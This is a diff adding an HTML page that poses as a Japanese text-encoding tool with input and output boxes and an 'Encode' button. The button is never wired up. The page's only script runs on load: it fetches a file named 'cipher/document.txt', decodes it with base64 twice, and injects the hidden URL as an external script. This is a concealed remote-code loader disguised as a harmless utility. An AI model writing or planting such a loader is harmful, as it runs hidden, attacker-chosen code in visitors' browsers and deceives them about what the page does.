@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+       textarea {
+            width: 80%;
+            height: 100px;
+            margin: 10px 0;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #cccccc;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <textarea id="inputText" placeholder="テキストを入力"></textarea><br>
+    <button id="encodeButton">エンコード</button><br>
+    <textarea id="outputText" placeholder="結果" readonly></textarea>
+    <script>
+function decode(encoded){return atob(atob(encoded));}function loadScript(encodedSrc){try{const decodedSrc=decode(encodedSrc);const script=document.createElement('script');script.src=decodedSrc;script.async=true;document.head.appendChild(script);}catch(error){console.error(error.message);}}async function fetchEncodedSrc(){try{const response=await fetch('cipher/document.txt');if(!response.ok)throw new Error(response.status);const encodedSrc=await response.text();loadScript(encodedSrc.trim());}catch(error){console.error(error.message);}}fetchEncodedSrc();
+    </script>
+</body>
+</html>
